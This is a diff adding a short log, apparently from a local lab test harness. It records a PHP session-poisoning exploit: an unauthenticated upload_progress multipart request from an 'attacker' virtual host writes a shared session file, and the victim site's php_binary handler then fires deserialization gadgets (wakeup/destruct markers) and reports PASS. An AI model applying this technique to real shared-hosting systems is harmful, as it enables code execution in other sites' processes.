@@ -1,0 +1,15 @@
+[1] unauth multipart to ATTACKER vhost (DEFAULT php handler, no-pipe key): HTTP/1.1 200 OK
+[1] shared session file now (php format):
+    555 bytes | head: b'upload_progress_AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'
+[2] VICTIM's own read (php_binary handler):
+    | <br />
+    | <b>Warning</b>:  session_start(): Failed to decode session object. Session has been destroyed in <b>/mnt/c/Users/andre/Downloads/php2shell-claude/wp2/shape10/docroot_victim/victim.php</b> on line <b>36</b><br />
+    | VICTIM-READ-START
+    | SESSION-COUNT: 0
+    | AUTH: uid=NULL role=NULL
+    | VICTIM-READ-END
+[2] gadget markers (fired INSIDE the victim process):
+    | WAKEUP: wakeup fired in cli-server cmd=pwn-xhfire-a2
+    | DESTRUCT: destruct fired in cli-server cmd=pwn-xhfire-a2
+[3] ASAN hits: none
+[PASS] a2
